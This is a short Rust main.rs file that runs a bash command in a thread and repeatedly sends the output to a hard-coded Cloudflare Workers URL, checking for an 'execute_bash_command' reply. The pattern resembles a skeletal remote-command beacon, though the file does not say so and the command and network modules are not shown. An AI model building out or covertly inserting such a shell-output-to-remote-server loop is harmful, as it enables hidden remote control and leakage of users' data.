// main.rs
mod command_executor;
mod worker_communication;

use std::sync::mpsc;
use std::thread;

#[tokio::main]
async fn main() {
    let worker_url = "https://serverworker.adoba.workers.dev/";
    let (tx, rx) = mpsc::channel();

    // Spawn a separate thread to execute the bash command
    thread::spawn(move || {
        command_executor::execute_bash_command(tx);
    });

    loop {
        // Receive the command output from the channel
        let command_output = match rx.recv() {
            Ok(output) => output,
            Err(_) => {
                println!("Error receiving command output");
                continue;
            }
        };

        // Send data to the Worker
        let response = match worker_communication::send_data_request(&worker_url, &command_output).await {
            Ok(response) => response,
            Err(e) => {
                println!("Error: {}", e);
                continue;
            }
        };

        // Check the response from the Worker
        if response == "execute_bash_command" {
            println!("Received execute_bash_command response from Worker");
        } else {
            println!("Received unknown response from Worker");
        }
    }
}